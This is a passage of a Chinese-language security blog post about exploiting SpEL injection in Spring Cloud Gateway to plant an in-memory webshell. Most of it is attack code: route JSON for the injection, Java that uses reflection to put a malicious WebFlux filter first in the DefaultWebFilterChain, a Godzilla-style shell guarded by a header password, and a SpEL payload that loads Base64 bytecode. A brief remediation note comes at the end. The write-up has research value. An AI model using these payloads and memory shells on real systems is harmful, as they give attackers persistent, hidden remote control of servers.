实际上下列predicates都能用：
### 回显
用户定义的路由信息会存在内存中，refresh后会把结果写入路由信息。通过路由信息的API看到RCE的结果（就上面payload注册完路由后GET访问路由路径）
  * 利用RedirectTO过滤器注入：
    {
        "id": "first_route",
        "predicates": [],
        "filters": [{
            "name": "RedirectTo",
            "args": 
                {
                    "status": "302",
                    "url": "payload"
                }
        }],
        "uri": "https://www.uri-destination.org",
        "order": 0
    }
在spring官方文档可以看到RedirectTo接收两个参数，一个status一个url，但是会验证参数类型，也就是说status就必须是枚举类型，url就会进行url解析，所以该过滤器不能使用，没有传入字符串类型的参数，如RemoveRequestHeader，同理对predicates链
## 注入内存马
spring cloud gateway是基于WebFlux的，关于WebFlux，这篇文章有详尽的说明：
web服务基于netty和spring，c0ny1佬对针对netty和spring构造了内存马
### netty内存马
netty处理http请求会用pipeline链上的handler依次来处理，内存马就是模拟注册一个handler。但是netty是动态构造pipeline。
动态添加handler的CompositeChannelPipelineConfigurer的compositeChannelPipelineConfigurer第二个参数other默认为空，即默认第一个。如果第二个参数other有值，将被合并为一个新Configurer
使用reactor.netty.transport.TransportConfig#doOnchannelInit来获取Configurer
至于构造netty内存马的代码，已经来到了知识盲区，直接移步
### 内存马
分析一遍mieea佬的webFilter内存马
spring Webflux是有filter的，在官方文档里有：
我们知道filter一般都是一个链，在这里是用DefaultWebFilterChain
在`DefaultWebFilterChain#invokefilter()`处触发filter
可以看到filter()参数只有ServerWebExchange，那模拟就return调用下一个filter构成filter链
一个Filter Demo:
    import org.springframework.core.annotation.Order;
    import org.springframework.stereotype.Component;
    import org.springframework.web.server.ServerWebExchange;
    import org.springframework.web.server.WebFilter;
    import org.springframework.web.server.WebFilterChain;
    import reactor.core.publisher.Mono;
    @Component
    @Order(value = 2)
    public class NormalFilter implements WebFilter{
        @Override
        public Mono filter(ServerWebExchange exchange, WebFilterChain chain) {
            return chain.filter(exchange);
        }
    }
反射利用DefaultWebFilterChain#initChain()模拟注册一个filter:
该Chain由FilteringWebHandler生成实例，直接new FilteringWebHandler就能将Filter插入到首位
#### poc构造：
调试环境：
使用c0ny1师傅的java-Object-searcher工具（
新建一个NormalFilter，把编译好的java-obejct-searcher-0.1.0.jar导入到target目录下，项目启动后触发一遍filter
    import me.gv7.tools.josearcher.entity.Blacklist;
    import me.gv7.tools.josearcher.entity.Keyword;
    import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
    import org.springframework.core.annotation.Order;
    import org.springframework.stereotype.Component;
    import org.springframework.web.server.ServerWebExchange;
    import org.springframework.web.server.WebFilter;
    import org.springframework.web.server.WebFilterChain;
    import reactor.core.publisher.Mono;
    import java.util.ArrayList;
    import java.util.List;
    @Component
    @Order(value = 2)
    public class NormalFilter implements WebFilter {
        @Override
        public Mono filter(ServerWebExchange exchange, WebFilterChain chain) {
            //设置搜索类型包含Request关键字的对象
            List keys = new ArrayList<>();
            keys.add(new Keyword.Builder().setField_type("chain").build());
            List blacklists = new ArrayList<>();
            blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
            SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
            searcher.setBlacklists(blacklists);
            searcher.setIs_debug(true);
            searcher.setMax_search_depth(10);
            searcher.setReport_save_path("xx");
            searcher.searchObject();
            return chain.filter(exchange);
        }
    }
如下：
于是我们得到内存马构造的流程：
  1. 构造恶意filter
哥斯拉里面生成jsp的马
filter不能影响正常的业务，加一个身份验证的http头：
    String authorizationHeader = exchange.getRequest().getHeaders().getFirst(HttpHeaders.AUTHORIZATION);
    if(authorizationHeader != null && authorizationHeader.equals(auth)) {......}
表单数据用`ServerWebexchange.getFormData()`获取
    Mono> formData = exchange.getFormData();
获取到的数据是键值对数据流，用flatMap对数据流进行合并化：
    Mono bufferStream = formData.flatMap(map -> {
                    String passStr = map.getFirst(pass);
                    StringBuilder result = new StringBuilder();
                    ......
                    return Mono.just(new DefaultDataBufferFactory().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));
    });
为方便移植，把哥斯拉的session换成`Map`
    public static Map store = new HashMap<>();
  1. 从线程中获取到DefaultWebFilterChain:
    getThreads = Thread.class.getDeclaredMethod("getThreads");
            getThreads.setAccessible(true);
            Object threads = getThreads.invoke(null);
            for (int i = 0; i  newAllFilters= new ArrayList<>(defaultWebFilterChain.getFilters());
    newAllFilters.add(0,new FilterMemshellPro());
    DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
生成filteringWebHandler:
    Field f = filteringWebHandler.getClass().getDeclaredField("chain");
    ....
    f.set(filteringWebHandler,newChain);
直达github完整poc：
#### spel表达式注入字节码
Memshell改为你的软件包名+shell
    #{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}
> 其中`'yv66vgAAA....'`为Base64Encode的字节码，可通过如下代码生成：
>  
>  
>     import org.springframework.util.Base64Utils;
>  
>     import java.io.*;
>     import java.nio.charset.StandardCharsets;
>  
>     public class EncodeShell {
>      public static void main(String[] args){
>          byte[] data = null;
>          try {
>              InputStream in = new FileInputStream("MemShell.class");
>              data = new byte[in.available()];
>              in.read(data);
>              in.close();
>          } catch (IOException e) {
>              e.printStackTrace();
>          }
>          String shellStr = Base64Utils.encodeToString(data);
>          System.out.println(shellStr);
>          try {
>              OutputStream out = new FileOutputStream("ShellStr.txt");
>              out.write(shellStr.getBytes(StandardCharsets.UTF_8));
>              out.flush();
>              out.close();
>          } catch (IOException e) {
>              e.printStackTrace();
>          }
>      }
>     }
>  
如果注入过程有问题，可以在docker中看下Log
## 漏洞修复
commit的历史中，把StandardEvaluationContext替换为了SimpleEvalutionContext
参考：[spel表达式注入](https://blog.csdn.net/ExpLang/article/details/121670490?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167927922816800192224617%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167927922816800192224617&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-121670490-null-null.142^v74^control,201^v4^add_ask,239^v2^insert_chatgpt&utm_term=spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187)
[spel注入分析](https://www.cnblogs.com/N0r4h/p/15986151.html)